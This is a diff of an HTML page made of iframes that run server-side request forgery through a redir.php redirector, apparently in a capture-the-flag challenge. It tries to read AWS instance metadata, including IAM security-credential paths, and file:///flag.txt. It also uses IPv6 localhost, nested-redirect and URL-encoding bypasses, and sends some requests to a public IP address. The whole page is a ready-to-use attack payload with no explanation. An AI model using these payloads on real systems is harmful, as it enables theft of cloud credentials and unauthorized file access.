@@ -1,58 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Version Bypass Attempts</title>
-    <style>
-        .section { margin: 15px 0; padding: 10px; border: 1px solid #ccc; }
-        h3 { color: #333; margin: 5px 0; }
-    </style>
+    <title>Focused High-Probability Test</title>
 </head>
 <body>
-    <h1>Version-Based Bypass Attempts</h1>
+    <h1>Most Promising Techniques</h1>
     
-    <!-- Try version 1.0 endpoints -->
-    <div class="section">
-        <h3>1. Version 1.0 Direct Access</h3>
-        <iframe src="http://54.209.100.76/redir.php?url=http://169.254.169.254/latest/meta-data/" width="100%" height="200"></iframe>
-        <iframe src="http://54.209.100.76/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
-    </div>
+    <!-- AWS Legacy API (most likely to work) -->
+    <h3>1. AWS Legacy API (Pre-IMSv2)</h3>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
+    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
     
-    <!-- Try v1.0 subdirectory -->
-    <div class="section">
-        <h3>2. Version 1.0 Subdirectory</h3>
-        <iframe src="http://localhost/v1.0/redir.php?url=http://169.254.169.254/latest/meta-data/" width="100%" height="200"></iframe>
-        <iframe src="http://localhost/1.0/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
-    </div>
+    <!-- IPv6 localhost variations -->
+    <h3>2. IPv6 Localhost (Based on ::1 in responses)</h3>
+    <iframe src="http://localhost/redir.php?url=http://[::1]/flag.txt" width="100%" height="150"></iframe>
+    <iframe src="http://localhost/redir.php?url=file://[::1]/flag.txt" width="100%" height="150"></iframe>
     
-    <!-- Try old version paths -->
-    <div class="section">
-        <h3>3. Legacy Paths</h3>
-        <iframe src="http://localhost/old/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
-        <iframe src="http://localhost/legacy/redir.php?url=http://169.254.169.254/latest/meta-data/" width="100%" height="200"></iframe>
-    </div>
+    <!-- Server ready endpoint expansion -->
+    <h3>3. Info.php Endpoint (Got "Server ready")</h3>
+    <iframe src="http://localhost/redir.php?url=http://localhost/info.php?show=flag" width="100%" height="150"></iframe>
+    <iframe src="http://localhost/redir.php?url=http://localhost/info.php?flag=1" width="100%" height="150"></iframe>
+    <iframe src="http://localhost/redir.php?url=http://localhost/info.php?action=flag" width="100%" height="150"></iframe>
     
-    <!-- Try the Server ready endpoint more thoroughly -->
-    <div class="section">
-        <h3>4. Status/Debug Endpoints (Expand on "Server ready")</h3>
-        <iframe src="http://localhost/redir.php?url=http://localhost/info.php" width="100%" height="200"></iframe>
-        <iframe src="http://localhost/redir.php?url=http://localhost/status.php" width="100%" height="150"></iframe>
-        <iframe src="http://localhost/redir.php?url=http://localhost/debug.php" width="100%" height="150"></iframe>
-        <iframe src="http://localhost/redir.php?url=http://localhost/server.php" width="100%" height="150"></iframe>
-    </div>
-    
-    <!-- Try accessing redirector with different parameters -->
-    <div class="section">
-        <h3>5. Redirector Parameter Variations</h3>
-        <iframe src="http://localhost/redir.php?target=file:///flag.txt" width="100%" height="150"></iframe>
-        <iframe src="http://localhost/redir.php?uri=file:///flag.txt" width="100%" height="150"></iframe>
-        <iframe src="http://localhost/redir.php?redirect=http://169.254.169.254/latest/meta-data/" width="100%" height="200"></iframe>
-    </div>
-    
-    <!-- Try bypassing the redirector restriction -->
-    <div class="section">
-        <h3>6. Bypass Techniques</h3>
-        <iframe src="http://localhost/redir.php?url=http://localhost/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
-        <iframe src="http://localhost/redir.php?url=http%3A//169.254.169.254/latest/meta-data/" width="100%" height="200"></iframe>
-    </div>
+    <!-- Version 1.0 direct access -->
+    <h3>4. Version 1.0 Access (From Release Notes)</h3>
+    <iframe src="http://54.209.100.76/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="200"></iframe>
+    <iframe src="http://54.209.100.76/redir.php?url=file:///flag.txt" width="100%" height="150"></iframe>
 </body>
 </html>
